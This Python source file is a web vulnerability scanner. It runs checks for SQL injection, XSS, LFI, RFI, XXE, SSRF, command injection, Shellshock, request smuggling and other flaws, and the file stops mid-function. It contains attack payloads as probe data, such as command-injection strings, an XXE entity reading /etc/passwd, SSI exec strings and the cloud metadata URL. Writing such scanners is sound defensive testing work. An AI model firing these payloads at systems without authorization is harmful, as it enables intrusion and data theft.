#!/usr/bin/env python3
"""
VAPT Scanner - Vulnerability Assessment & Penetration Testing Tool
Educational/Authorized Use Only
"""
import socket
import requests
import argparse
import ssl
import re
import json
import base64
import time
import dns.resolver
import dns.zone
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
from datetime import datetime

# Suppress InsecureRequestWarning when using verify=False
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class VAPTScanner:
    def __init__(self, target):
        self.target = target
        self.results = {}
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({'User-Agent': 'VAPT-Scanner/1.0'})
    
    def port_scan(self, ports=None):
        """Scan common ports using thread pool"""
        if ports is None:
            ports = [21, 22, 23, 25, 80, 443, 3306, 3389, 5432, 8080]
        
        print(f"\n[*] Scanning ports on {self.target}")
        open_ports = []

        def check_port(port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target, port))
            sock.close()
            return port if result == 0 else None

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(check_port, port): port for port in ports}
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    open_ports.append(result)
                    print(f"[+] Port {result} is OPEN")

        open_ports.sort()
        self._record('port_scan', {'open_ports': open_ports})
        return open_ports

    def _record(self, test_name, finding):
        """Record a test result for JSON report output"""
        self.results[test_name] = {
            'timestamp': datetime.now().isoformat(),
            'finding': finding
        }
    
    def http_header_check(self, url):
        """Check security headers"""
        print(f"\n[*] Checking HTTP security headers for {url}")
        try:
            resp = self.session.get(url, timeout=5)
            headers = resp.headers
            
            security_headers = {
                'X-Frame-Options': 'Missing',
                'X-Content-Type-Options': 'Missing',
                'Strict-Transport-Security': 'Missing',
                'Content-Security-Policy': 'Missing',
                'X-XSS-Protection': 'Missing'
            }
            
            for header in list(security_headers.keys()):
                if header in headers:
                    security_headers[header] = headers[header]
                    print(f"[+] {header}: {headers[header]}")
                else:
                    print(f"[-] {header}: MISSING (Vulnerability)")
            
            self._record('http_header_check', security_headers)
            return security_headers
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def sql_injection_test(self, url):
        """Basic SQL injection detection"""
        print(f"\n[*] Testing for SQL injection on {url}")
        
        # Get baseline response to compare error messages
        try:
            baseline = self.session.get(f"{url}?id=1", timeout=5)
            baseline_text = baseline.text.lower()
        except Exception as e:
            baseline_text = ''
        
        payloads = ["'", "1' OR '1'='1", "' OR 1=1--", "admin'--"]
        # More specific SQL error indicators
        sql_errors = [
            'sql syntax', 'mysql_', 'mysqli_', 'pg_query', 'sqlite3',
            'unclosed quotation', 'quoted string not properly terminated',
            'syntax error', 'ORA-', 'microsoft ole db', 'odbc sql',
            'sql server', 'invalid query', 'sql command', 'database error'
        ]
        
        for payload in payloads:
            test_url = f"{url}?id={payload}"
            try:
                resp = self.session.get(test_url, timeout=5)
                resp_lower = resp.text.lower()
                # Only flag if error indicator appears but wasn't in baseline
                if any(err in resp_lower and err not in baseline_text for err in sql_errors):
                    print(f"[!] Potential SQLi vulnerability with payload: {payload}")
                    self._record('sql_injection_test', {'payload': payload})
                    return True
            except Exception as e:
                pass
        
        print("[+] No obvious SQL injection found")
        return False
    
    def xss_test(self, url):
        """Basic XSS detection"""
        print(f"\n[*] Testing for XSS on {url}")
        payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"]
        
        for payload in payloads:
            test_url = f"{url}?q={payload}"
            try:
                resp = self.session.get(test_url, timeout=5)
                if payload in resp.text:
                    print(f"[!] Potential XSS vulnerability detected")
                    return True
            except Exception as e:
                pass
        
        print("[+] No obvious XSS found")
        return False
    
    def directory_scan(self, base_url):
        """Scan for common directories"""
        print(f"\n[*] Scanning directories on {base_url}")
        if not base_url.endswith('/'):
            base_url += '/'
        
        # Detect soft-404 pattern
        try:
            not_found_resp = self.session.get(urljoin(base_url, 'nonexistent_dir_xyz987/'), timeout=3, allow_redirects=False)
            soft_404_length = len(not_found_resp.content) if not_found_resp.status_code == 200 else 0
        except Exception as e:
            soft_404_length = 0
        
        dirs = ['admin', 'login', 'backup', 'config', 'uploads', 'api', 'test', '.git']
        found = []
        
        for d in dirs:
            url = urljoin(base_url, d)
            try:
                resp = self.session.get(url, timeout=3, allow_redirects=False)
                if resp.status_code in [200, 301, 302, 403]:
                    # Skip if this looks like a soft-404
                    if resp.status_code == 200 and soft_404_length > 0:
                        if abs(len(resp.content) - soft_404_length) < 50:
                            continue
                    print(f"[+] Found: {url} (Status: {resp.status_code})")
                    found.append(url)
            except Exception as e:
                pass
        
        return found
    
    def ssl_check(self, hostname):
        """Check SSL/TLS certificate"""
        print(f"\n[*] Checking SSL certificate for {hostname}")
        try:
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    print(f"[+] SSL Version: {ssock.version()}")
                    print(f"[+] Issuer: {dict(x[0] for x in cert['issuer'])}")
                    print(f"[+] Valid until: {cert['notAfter']}")
                    return True
        except Exception as e:
            print(f"[-] SSL Error: {e}")
            return False
    
    def subdomain_enum(self, domain):
        """Basic subdomain enumeration"""
        print(f"\n[*] Enumerating subdomains for {domain}")
        subdomains = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging']
        found = []
        
        for sub in subdomains:
            hostname = f"{sub}.{domain}"
            try:
                socket.gethostbyname(hostname)
                print(f"[+] Found: {hostname}")
                found.append(hostname)
            except Exception as e:
                pass
        
        return found
    
    def cms_detection(self, url):
        """Detect CMS/framework"""
        print(f"\n[*] Detecting CMS/Framework on {url}")
        try:
            resp = self.session.get(url, timeout=5)
            content = resp.text.lower()
            
            cms_signatures = {
                'WordPress': ['wp-content', 'wp-includes'],
                'Joomla': ['joomla', '/components/'],
                'Drupal': ['drupal', '/sites/default/'],
                'Django': ['csrfmiddlewaretoken'],
                'Laravel': ['laravel_session'],
                'React': ['react', '__react']
            }
            
            for cms, signatures in cms_signatures.items():
                if any(sig in content for sig in signatures):
                    print(f"[+] Detected: {cms}")
                    return cms
            
            print("[+] CMS not identified")
            return None
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def robots_check(self, base_url):
        """Check robots.txt for sensitive paths"""
        print(f"\n[*] Checking robots.txt")
        try:
            resp = self.session.get(urljoin(base_url, '/robots.txt'), timeout=5)
            if resp.status_code == 200:
                print(f"[+] robots.txt found:")
                disallowed = [line for line in resp.text.split('\n') if 'disallow' in line.lower()]
                for line in disallowed[:10]:
                    print(f"    {line.strip()}")
                return resp.text
            else:
                print("[-] robots.txt not found")
        except Exception as e:
            print("[-] robots.txt not accessible")
        return None
    
    def cors_check(self, url):
        """Check CORS misconfiguration"""
        print(f"\n[*] Checking CORS policy")
        try:
            headers = {'Origin': 'https://evil.com'}
            resp = self.session.get(url, headers=headers, timeout=5)
            acao = resp.headers.get('Access-Control-Allow-Origin')
            
            if acao == '*':
                print("[!] CORS misconfiguration: Allows all origins (*)")
                return True
            elif acao == 'https://evil.com':
                print("[!] CORS misconfiguration: Reflects arbitrary origin")
                return True
            else:
                print("[+] CORS properly configured")
                return False
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def clickjacking_test(self, url):
        """Test for clickjacking vulnerability"""
        print(f"\n[*] Testing for clickjacking")
        try:
            resp = self.session.get(url, timeout=5)
            xfo = resp.headers.get('X-Frame-Options')
            csp = resp.headers.get('Content-Security-Policy', '')
            
            if not xfo and 'frame-ancestors' not in csp:
                print("[!] Vulnerable to clickjacking (no X-Frame-Options or CSP frame-ancestors)")
                return True
            else:
                print("[+] Protected against clickjacking")
                return False
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def open_redirect_test(self, url):
        """Test for open redirect"""
        print(f"\n[*] Testing for open redirect")
        payloads = ['//evil.com', 'https://evil.com', '//google.com']
        
        for payload in payloads:
            test_url = f"{url}?redirect={payload}"
            try:
                resp = self.session.get(test_url, timeout=5, allow_redirects=False)
                if resp.status_code in [301, 302, 303, 307, 308]:
                    location = resp.headers.get('Location', '')
                    if 'evil.com' in location or 'google.com' in location:
                        print(f"[!] Open redirect found with payload: {payload}")
                        return True
            except Exception as e:
                pass
        
        print("[+] No open redirect found")
        return False
    
    def info_disclosure(self, url):
        """Check for information disclosure"""
        print(f"\n[*] Checking for information disclosure")
        # Each path has associated content indicators to reduce false positives
        checks = [
            ('/.env', ['DB_', 'APP_', 'SECRET', 'PASSWORD', 'API_KEY']),
            ('/.git/config', ['[core]', '[remote', 'repositoryformatversion']),
            ('/phpinfo.php', ['phpinfo()', 'PHP Version', 'Configuration']),
            ('/config.php', ['<?php', 'password', 'database']),
            ('/web.config', ['<configuration', 'connectionString']),
        ]
        found = []
        
        for path, indicators in checks:
            test_url = urljoin(url, path)
            try:
                resp = self.session.get(test_url, timeout=3)
                if resp.status_code == 200 and len(resp.content) > 50:
                    # Verify content matches expected sensitive file content
                    if any(ind.lower() in resp.text.lower() for ind in indicators):
                        print(f"[!] Sensitive file exposed: {test_url}")
                        found.append(test_url)
            except Exception as e:
                pass
        
        if not found:
            print("[+] No obvious information disclosure")
        else:
            self._record('info_disclosure', {'exposed_files': found})
        return found
    
    def lfi_test(self, url):
        """Test for Local File Inclusion"""
        print(f"\n[*] Testing for LFI")
        payloads = ['../../../etc/passwd', '..\\..\\..\\windows\\win.ini', '/etc/passwd']
        
        for payload in payloads:
            test_url = f"{url}?file={payload}"
            try:
                resp = self.session.get(test_url, timeout=5)
                if 'root:' in resp.text or '[extensions]' in resp.text:
                    print(f"[!] LFI vulnerability detected with: {payload}")
                    return True
            except Exception as e:
                pass
        
        print("[+] No LFI found")
        return False
    
    def rfi_test(self, url):
        """Test for Remote File Inclusion"""
        print(f"\n[*] Testing for RFI")
        # Use a known external URL and check if its content appears in the response
        rfi_urls = [
            'http://example.com/test.txt',
            'https://www.google.com/robots.txt',
        ]
        
        for rfi_url in rfi_urls:
            test_url = f"{url}?file={rfi_url}"
            try:
                resp = self.session.get(test_url, timeout=5)
                # Check if response contains content that looks like it came from the remote file
                if resp.status_code == 200:
                    # example.com has specific content
                    if 'example domain' in resp.text.lower() or 'illustrative examples' in resp.text.lower():
                        print(f"[!] RFI vulnerability: remote content from {rfi_url} included")
                        return True
                    # Google robots.txt has specific content
                    if 'user-agent' in resp.text.lower() and 'disallow' in resp.text.lower() and 'google' in rfi_url:
                        print(f"[!] RFI vulnerability: remote content from {rfi_url} included")
                        return True
            except Exception as e:
                pass
        
        print("[+] No RFI found")
        return False
    
    def xxe_test(self, url):
        """Test for XML External Entity injection"""
        print(f"\n[*] Testing for XXE")
        xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""
        
        try:
            headers = {'Content-Type': 'application/xml'}
            resp = self.session.post(url, data=xxe_payload, headers=headers, timeout=5)
            if 'root:' in resp.text:
                print("[!] XXE vulnerability detected")
                return True
        except Exception as e:
            pass
        
        print("[+] No XXE found")
        return False
    
    def ssrf_test(self, url):
        """Test for Server-Side Request Forgery"""
        print(f"\n[*] Testing for SSRF")
        
        # Get baseline to compare against
        try:
            baseline = self.session.get(url, timeout=5)
            baseline_text = baseline.text
        except Exception as e:
            baseline_text = ''
        
        payloads = [
            ('http://127.0.0.1', ['<html', 'apache', 'nginx', 'server']),
            ('http://localhost', ['<html', 'apache', 'nginx', 'server']),
            ('http://169.254.169.254/latest/meta-data/', ['ami-id', 'instance-id', 'iam']),
        ]
        
        for payload_url, indicators in payloads:
            test_url = f"{url}?url={payload_url}"
            try:
                resp = self.session.get(test_url, timeout=5)
                if resp.status_code == 200 and len(resp.content) > 0:
                    # Check for internal content indicators not in baseline
                    resp_lower = resp.text.lower()
                    if any(ind in resp_lower and ind not in baseline_text.lower() for ind in indicators):
                        print(f"[!] SSRF detected with payload: {payload_url}")
                        self._record('ssrf_test', {'payload': payload_url})
                        return True
            except Exception as e:
                pass
        
        print("[+] No SSRF found")
        return False
    
    def command_injection_test(self, url):
        """Test for command injection"""
        print(f"\n[*] Testing for command injection")
        
        # Get baseline to compare
        try:
            baseline = self.session.get(url, timeout=5)
            baseline_text = baseline.text.lower()
        except Exception as e:
            baseline_text = ''
        
        payloads = ['; ls', '| whoami', '`id`', '$(whoami)']
        # Indicators specific to command output (not general text)
        cmd_indicators = ['uid=', 'gid=', 'groups=', 'root:x:', '/bin/', '/usr/']
        
        for payload in payloads:
            test_url = f"{url}?cmd={payload}"
            try:
                resp = self.session.get(test_url, timeout=5)
                resp_lower = resp.text.lower()
                # Only flag if indicator appears in response but NOT in baseline
                if any(ind in resp_lower and ind not in baseline_text for ind in cmd_indicators):
                    print(f"[!] Command injection detected with: {payload}")
                    self._record('command_injection_test', {'payload': payload})
                    return True
            except Exception as e:
                pass
        
        print("[+] No command injection found")
        return False
    
    def jwt_test(self, url):
        """Test JWT security"""
        print(f"\n[*] Testing JWT security")
        try:
            resp = self.session.get(url, timeout=5)
            cookies = resp.cookies
            auth_header = resp.headers.get('Authorization', '')
            
            # Check for JWT in cookies or headers
            jwt_token = None
            for cookie in cookies:
                if 'jwt' in cookie.lower() or 'token' in cookie.lower():
                    jwt_token = cookies[cookie]
                    break
            
            if 'Bearer' in auth_header:
                jwt_token = auth_header.split('Bearer ')[-1]
            
            if jwt_token and jwt_token.count('.') == 2:
                parts = jwt_token.split('.')
                # JWT uses base64url encoding - add proper padding
                padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
                header = json.loads(base64.urlsafe_b64decode(padded))
                
                if header.get('alg') == 'none':
                    print("[!] JWT uses 'none' algorithm - Critical vulnerability")
                    return True
                elif header.get('alg') == 'HS256':
                    print("[+] JWT uses HS256 (check for weak secrets separately)")
                
                print(f"[+] JWT algorithm: {header.get('alg')}")
        except Exception as e:
            pass
        
        print("[+] No JWT issues detected")
        return False
    
    def http_methods_test(self, url):
        """Test for dangerous HTTP methods"""
        print(f"\n[*] Testing HTTP methods")
        methods = ['OPTIONS', 'PUT', 'DELETE', 'TRACE', 'CONNECT']
        dangerous = []
        
        for method in methods:
            try:
                resp = self.session.request(method, url, timeout=5)
                if resp.status_code not in [405, 501]:
                    print(f"[!] {method} method is enabled")
                    dangerous.append(method)
            except Exception as e:
                pass
        
        if not dangerous:
            print("[+] No dangerous HTTP methods enabled")
        return dangerous
    
    def security_txt_check(self, base_url):
        """Check for security.txt file"""
        print(f"\n[*] Checking for security.txt")
        paths = ['/.well-known/security.txt', '/security.txt']
        
        for path in paths:
            try:
                resp = self.session.get(urljoin(base_url, path), timeout=5)
                if resp.status_code == 200:
                    print(f"[+] security.txt found at {path}")
                    print(resp.text[:200])
                    return True
            except Exception as e:
                pass
        
        print("[-] security.txt not found")
        return False
    
    def api_endpoint_scan(self, base_url):
        """Scan for common API endpoints"""
        print(f"\n[*] Scanning API endpoints")
        endpoints = ['/api/v1', '/api/v2', '/graphql', '/swagger', '/api-docs', 
                    '/api/users', '/api/admin', '/rest/api', '/api/config']
        found = []
        
        for endpoint in endpoints:
            url = urljoin(base_url, endpoint)
            try:
                resp = self.session.get(url, timeout=3)
                if resp.status_code in [200, 401, 403]:
                    print(f"[+] API endpoint found: {url} (Status: {resp.status_code})")
                    found.append(url)
            except Exception as e:
                pass
        
        return found
    
    def backup_file_scan(self, base_url):
        """Scan for backup files"""
        print(f"\n[*] Scanning for backup files")
        if not base_url.endswith('/'):
            base_url += '/'
        
        # Get a baseline 404 response length for comparison
        try:
            not_found_resp = self.session.get(urljoin(base_url, 'nonexistent_xyz123.bak'), timeout=2)
            soft_404_length = len(not_found_resp.content) if not_found_resp.status_code == 200 else 0
        except Exception as e:
            soft_404_length = 0
        
        extensions = ['.bak', '.old', '.backup', '.zip', '.tar.gz', '~', '.swp']
        files = ['index', 'config', 'database', 'db', 'backup', 'admin']
        found = []
        
        for file in files:
            for ext in extensions:
                url = urljoin(base_url, f"{file}{ext}")
                try:
                    resp = self.session.get(url, timeout=2)
                    if resp.status_code == 200 and len(resp.content) > 0:
                        # Filter out soft-404 pages (same size as known nonexistent file)
                        if soft_404_length == 0 or abs(len(resp.content) - soft_404_length) > 50:
                            print(f"[!] Backup file found: {url} ({len(resp.content)} bytes)")
                            found.append(url)
                except Exception as e:
                    pass
        
        if not found:
            print("[+] No backup files found")
        else:
            self._record('backup_file_scan', {'files': found})
        return found
    
    def cookie_security_check(self, url):
        """Check cookie security attributes"""
        print(f"\n[*] Checking cookie security")
        try:
            resp = self.session.get(url, timeout=5)
            cookies = resp.cookies
            
            if not cookies:
                print("[-] No cookies set")
                return None
            
            for cookie in cookies:
                print(f"\n[*] Cookie: {cookie.name}")
                if not cookie.secure:
                    print(f"  [!] Missing Secure flag")
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    print(f"  [!] Missing HttpOnly flag")
                if not cookie.has_nonstandard_attr('SameSite'):
                    print(f"  [!] Missing SameSite attribute")
                
            return True
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def dns_zone_transfer(self, domain):
        """Test for DNS zone transfer vulnerability"""
        print(f"\n[*] Testing DNS zone transfer for {domain}")
        try:
            import dns.query
            ns_records = dns.resolver.resolve(domain, 'NS')
            for ns in ns_records:
                ns_server = str(ns).rstrip('.')
                try:
                    zone = dns.zone.from_xfr(dns.query.xfr(ns_server, domain))
                    if zone:
                        print(f"[!] Zone transfer successful from {ns_server}")
                        return True
                except Exception as e:
                    pass
            
            print("[+] Zone transfer not allowed")
            return False
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def shellshock_test(self, url):
        """Test for Shellshock vulnerability"""
        print(f"\n[*] Testing for Shellshock")
        payload = "() { :; }; echo; echo vulnerable"
        headers = {
            'User-Agent': payload,
            'Referer': payload,
            'Cookie': payload
        }
        
        try:
            resp = self.session.get(url, headers=headers, timeout=5)
            if 'vulnerable' in resp.text:
                print("[!] Shellshock vulnerability detected")
                return True
            
            print("[+] Not vulnerable to Shellshock")
            return False
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def heartbleed_test(self, hostname):
        """Basic Heartbleed detection (CVE-2014-0160)"""
        print(f"\n[*] Testing for Heartbleed (CVE-2014-0160)")
        try:
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    version = ssock.version()
                    # Heartbleed affects OpenSSL 1.0.1 through 1.0.1f
                    # Modern TLS libraries are patched; check protocol and cipher info
                    openssl_version = ssl.OPENSSL_VERSION
                    
                    print(f"[+] TLS Version: {version}")
                    print(f"[+] OpenSSL: {openssl_version}")
                    
                    # Parse OpenSSL version to check if vulnerable
                    # Vulnerable: OpenSSL 1.0.1 through 1.0.1f
                    match = re.search(r'OpenSSL (\d+\.\d+\.\d+)([a-z]?)', openssl_version)
                    if match:
                        ver = match.group(1)
                        patch = match.group(2)
                        if ver == '1.0.1' and patch in ('', 'a', 'b', 'c', 'd', 'e', 'f'):
                            print(f"[!] Vulnerable OpenSSL version: {openssl_version}")
                            self._record('heartbleed_test', {'vulnerable': True, 'openssl': openssl_version})
                            return True
                    
                    # Also flag deprecated protocols as a risk indicator
                    if version in ['TLSv1', 'TLSv1.1']:
                        print(f"[!] Deprecated protocol {version} in use (not Heartbleed, but insecure)")
                        self._record('heartbleed_test', {'vulnerable': False, 'deprecated_protocol': version})
                        return False
                    
                    print(f"[+] Not vulnerable to Heartbleed")
                    return False
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def http_request_smuggling(self, url):
        """Test for HTTP request smuggling"""
        print(f"\n[*] Testing for HTTP request smuggling")
        
        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or 80
        
        # CL.TE probe: send conflicting Content-Length and Transfer-Encoding
        # If vulnerable, the server will process differently than a proxy
        cl_te_payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"
        )
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            sock.send(cl_te_payload.encode())
            response = sock.recv(4096).decode(errors='replace')
            sock.close()
            
            # A smuggling indicator is getting a 400/405 on the smuggled "G" request
            # or timeout behavior difference
            if '405' in response or 'method not allowed' in response.lower():
                print("[!] Possible CL.TE request smuggling (405 on smuggled prefix)")
                self._record('http_request_smuggling', {'type': 'CL.TE', 'indicator': '405 response'})
                return True
            
        except socket.timeout:
            # Timeout can indicate the server is holding the connection waiting for chunked data
            print("[!] Server timeout may indicate request smuggling susceptibility")
            return True
        except Exception as e:
            pass
        
        print("[+] No request smuggling detected")
        return False
    
    def crlf_injection_test(self, url):
        """Test for CRLF injection"""
        print(f"\n[*] Testing for CRLF injection")
        payloads = [
            '%0d%0aSet-Cookie:test=injected',
            '%0aSet-Cookie:test=injected',
            '\r\nSet-Cookie:test=injected'
        ]
        
        for payload in payloads:
            test_url = f"{url}?redirect={payload}"
            try:
                resp = self.session.get(test_url, timeout=5, allow_redirects=False)
                if 'test=injected' in str(resp.headers):
                    print(f"[!] CRLF injection found with: {payload}")
                    return True
            except Exception as e:
                pass
        
        print("[+] No CRLF injection found")
        return False
    
    def xml_bomb_test(self, url):
        """Test for XML bomb (Billion Laughs)"""
        print(f"\n[*] Testing for XML bomb vulnerability")
        xml_bomb = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>"""
        
        try:
            headers = {'Content-Type': 'application/xml'}
            resp = self.session.post(url, data=xml_bomb, headers=headers, timeout=3)
            print("[+] Server handled XML bomb safely")
            return False
        except requests.exceptions.Timeout:
            print("[!] Server timeout - possible XML bomb vulnerability")
            return True
        except Exception as e:
            print("[+] No XML bomb vulnerability")
            return False
    
    def graphql_introspection(self, url):
        """Test GraphQL introspection"""
        print(f"\n[*] Testing GraphQL introspection")
        query = {"query": "{__schema{types{name}}}"}
        
        graphql_paths = ['/graphql', '/api/graphql', '/v1/graphql']
        
        for path in graphql_paths:
            test_url = urljoin(url, path)
            try:
                resp = self.session.post(test_url, json=query, timeout=5)
                if resp.status_code == 200 and '__schema' in resp.text:
                    print(f"[!] GraphQL introspection enabled at {test_url}")
                    return True
            except Exception as e:
                pass
        
        print("[+] GraphQL introspection not found or disabled")
        return False
    
    def websocket_test(self, url):
        """Test WebSocket security"""
        print(f"\n[*] Testing WebSocket security")
        
        try:
            # Check for WebSocket upgrade
            headers = {
                'Upgrade': 'websocket',
                'Connection': 'Upgrade',
                'Sec-WebSocket-Key': base64.b64encode(b'test').decode(),
                'Sec-WebSocket-Version': '13'
            }
            resp = self.session.get(url, headers=headers, timeout=5)
            
            if resp.status_code == 101:
                print("[!] WebSocket endpoint found - manual testing recommended")
                return True
            
            print("[+] No WebSocket endpoint detected")
            return False
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def content_type_confusion(self, url):
        """Test for Content-Type confusion"""
        print(f"\n[*] Testing for Content-Type confusion")
        
        try:
            # Upload HTML as image
            files = {'file': ('test.jpg', '<script>alert(1)</script>', 'image/jpeg')}
            resp = self.session.post(url, files=files, timeout=5)
            
            if '<script>' in resp.text:
                print("[!] Content-Type confusion vulnerability")
                return True
            
            print("[+] No Content-Type confusion detected")
            return False
        except Exception as e:
            print("[+] Upload endpoint not found")
            return False
    
    def http_response_splitting(self, url):
        """Test for HTTP response splitting"""
        print(f"\n[*] Testing for HTTP response splitting")
        payload = "test%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK"
        test_url = f"{url}?param={payload}"
        
        try:
            resp = self.session.get(test_url, timeout=5)
            if 'HTTP/1.1 200 OK' in resp.text:
                print("[!] HTTP response splitting vulnerability")
                return True
            
            print("[+] No response splitting found")
            return False
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def subdomain_takeover_check(self, domain):
        """Check for subdomain takeover"""
        print(f"\n[*] Checking for subdomain takeover")
        
        vulnerable_cnames = [
            'github.io',
            'herokuapp.com',
            'azurewebsites.net',
            'cloudfront.net',
            's3.amazonaws.com'
        ]
        
        subdomains = ['www', 'dev', 'staging', 'test', 'api']
        
        for sub in subdomains:
            hostname = f"{sub}.{domain}"
            try:
                answers = dns.resolver.resolve(hostname, 'CNAME')
                for rdata in answers:
                    cname = str(rdata.target)
                    if any(vuln in cname for vuln in vulnerable_cnames):
                        # Check if it resolves
                        try:
                            socket.gethostbyname(cname)
                        except Exception as e:
                            print(f"[!] Possible subdomain takeover: {hostname} -> {cname}")
                            return True
            except Exception as e:
                pass
        
        print("[+] No subdomain takeover detected")
        return False
    
    def oauth_misconfiguration_test(self, url):
        """Test for OAuth/OIDC misconfiguration"""
        print(f"\n[*] Testing OAuth/OIDC misconfiguration")
        
        oauth_endpoints = ['/oauth/authorize', '/oauth/token', '/.well-known/openid-configuration']
        
        for endpoint in oauth_endpoints:
            test_url = urljoin(url, endpoint)
            try:
                # Test redirect_uri manipulation
                params = {'redirect_uri': 'https://evil.com', 'response_type': 'code'}
                resp = self.session.get(test_url, params=params, timeout=5)
                
                if resp.status_code in [200, 302] and 'evil.com' in resp.text:
                    print(f"[!] OAuth redirect_uri not validated at {endpoint}")
                    return True
            except Exception as e:
                pass
        
        print("[+] No OAuth misconfiguration detected")
        return False
    
    def rate_limiting_check(self, url):
        """Check for API rate limiting"""
        print(f"\n[*] Testing API rate limiting")
        
        try:
            responses = []
            for _ in range(20):
                resp = self.session.get(url, timeout=2)
                responses.append(resp.status_code)
            
            if all(status == 200 for status in responses):
                print("[!] No rate limiting detected - vulnerable to brute force")
                return True
            elif 429 in responses:
                print("[+] Rate limiting is active (429 Too Many Requests)")
                return False
        except Exception as e:
            pass
        
        print("[+] Rate limiting check completed")
        return False
    
    def idor_test(self, url):
        """Test for Insecure Direct Object Reference"""
        print(f"\n[*] Testing for IDOR")
        
        # Test sequential IDs and compare responses for data leakage indicators
        test_ids = ['1', '2', '100', '999', '1000']
        
        responses = []
        for test_id in test_ids:
            test_url = f"{url}?id={test_id}"
            try:
                resp = self.session.get(test_url, timeout=5)
                responses.append((test_id, resp.status_code, len(resp.content), resp.text))
            except Exception as e:
                pass
        
        if not responses:
            print("[+] No IDOR test possible (no responses)")
            return False
        
        # IDOR indicator: different IDs return different data (not a generic page)
        # AND responses contain sensitive-looking data patterns
        successful = [(tid, sc, cl, text) for tid, sc, cl, text in responses if sc == 200 and cl > 0]
        
        if len(successful) >= 2:
            # Check that responses actually differ (not the same generic page)
            unique_lengths = set(cl for _, _, cl, _ in successful)
            sensitive_patterns = ['email', 'phone', 'address', 'password', 'ssn', 'credit', 'account']
            
            has_sensitive = any(
                any(pat in text.lower() for pat in sensitive_patterns)
                for _, _, _, text in successful
            )
            
            if len(unique_lengths) > 1 and has_sensitive:
                print(f"[!] Possible IDOR - sequential IDs return different data with sensitive fields")
                self._record('idor_test', {'vulnerable': True, 'ids_tested': test_ids})
                return True
        
        print("[+] No obvious IDOR found (responses consistent or no sensitive data)")
        return False
    
    def ssi_injection_test(self, url):
        """Test for Server-Side Include injection"""
        print(f"\n[*] Testing for SSI injection")
        
        payloads = [
            '<!--#exec cmd="ls"-->',
            '<!--#include virtual="/etc/passwd"-->',
            '<!--#echo var="DATE_LOCAL"-->'
        ]
        
        for payload in payloads:
            test_url = f"{url}?page={payload}"
            try:
                resp = self.session.get(test_url, timeout=5)
                if any(indicator in resp.text for indicator in ['root:', 'bin/', 'Monday', 'Tuesday']):
                    print(f"[!] SSI injection detected with: {payload}")
                    return True
            except Exception as e:
                pass
        
        print("[+] No SSI injection found")
        return False
    
    def xpath_injection_test(self, url):
        """Test for XPATH injection"""
        print(f"\n[*] Testing for XPATH injection")
        
        payloads = [
            "' or '1'='1",
            "' or 1=1 or ''='",
            "x' or 1=1 or 'x'='y",
            "admin' or '1'='1"
        ]
        
        # First get a baseline response
        try:
            baseline = self.session.get(f"{url}?user=normaluser", timeout=5)
            baseline_length = len(baseline.content)
        except Exception as e:
            baseline_length = 0
        
        xpath_errors = ['xpath', 'xmldom', 'xml parsing', 'invalid expression', 
                       'javax.xml', 'lxml', 'simplexml', 'domdocument']
        
        for payload in payloads:
            test_url = f"{url}?user={payload}"
            try:
                resp = self.session.get(test_url, timeout=5)
                # Check for XPATH-specific error messages
                if any(err in resp.text.lower() for err in xpath_errors):
                    print(f"[!] XPATH injection error disclosed with: {payload}")
                    return True
                # Check for significant content difference suggesting auth bypass
                if resp.status_code == 200 and baseline_length > 0:
                    if len(resp.content) > baseline_length * 2:
                        print(f"[!] Possible XPATH injection bypass with: {payload}")
                        return True
            except Exception as e:
                pass
        
        print("[+] No XPATH injection found")
        return False
    
    def ip_spoofing_test(self, url):
        """Test for IP-based security bypass"""
        print(f"\n[*] Testing IP spoofing/bypass")
        
        headers_to_test = {
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Originating-IP': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Client-IP': '127.0.0.1'
        }
        
        try:
            normal_resp = self.session.get(url, timeout=5)
            
            for header, value in headers_to_test.items():
                resp = self.session.get(url, headers={header: value}, timeout=5)
                if resp.status_code != normal_resp.status_code or len(resp.content) != len(normal_resp.content):
